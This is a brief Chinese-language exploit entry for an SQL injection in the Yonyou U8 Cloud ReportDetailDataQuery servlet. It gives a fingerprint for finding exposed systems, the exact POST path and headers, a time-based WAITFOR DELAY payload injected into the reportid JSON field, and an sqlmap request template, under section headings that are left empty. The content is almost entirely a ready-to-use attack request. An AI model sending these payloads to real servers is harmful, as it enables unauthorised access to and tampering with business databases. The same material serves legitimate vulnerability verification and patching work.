# 用友U8CloudReportDetailDataQuery存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 335`　`SL-CE-SUID: 126`

**请求体 / payload**
```
{"usercode":1,"reportid":"';WAITFOR DELAY '0:0:5'--"}

sqlmap
POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery HTTP/1.1
Host: {hostname}
Content-Length: 335
SL-CE-SUID: 126
{"usercode":1,"reportid":"*"}
```

**其他**
- 用友U8 Cloud ReportDetailDataQuery存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud